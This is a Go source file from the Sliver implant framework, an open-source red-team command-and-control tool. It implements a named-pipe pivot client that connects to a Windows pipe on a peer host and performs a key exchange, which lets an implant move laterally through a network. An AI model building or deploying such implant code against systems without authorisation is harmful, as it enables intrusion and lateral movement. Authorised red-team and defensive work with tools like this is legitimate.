package pivotclients

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.IncludeNamePipe}}

import (
	"net/url"
	"strings"
	"sync"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/lesnuages/go-winio"
)

// NamedPipePivotStartSession - Start a TCP pivot session with a peer
func NamedPipePivotStartSession(uri *url.URL, opts *NamedPipePivotOptions) (*NetConnPivotClient, error) {
	address := "\\\\" + uri.Hostname() + strings.Replace(uri.Path, "/", "\\", -1)
	// {{if .Config.Debug}}
	log.Printf("Pivot named pipe address: %s", address)
	log.Printf("Options: %+v", opts)
	// {{end}}
	conn, err := winio.DialPipe(address, nil)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to connect to named pipe: %s", err)
		// {{end}}
		return nil, err
	}

	pivot := &NetConnPivotClient{
		conn:       conn,
		readMutex:  &sync.Mutex{},
		writeMutex: &sync.Mutex{},

		readDeadline:  opts.ReadDeadline,
		writeDeadline: opts.WriteDeadline,
	}
	err = pivot.KeyExchange()
	if err != nil {
		conn.Close()
		return nil, err
	}
	return pivot, nil
}

// {{end}} -IncludeNamePipe
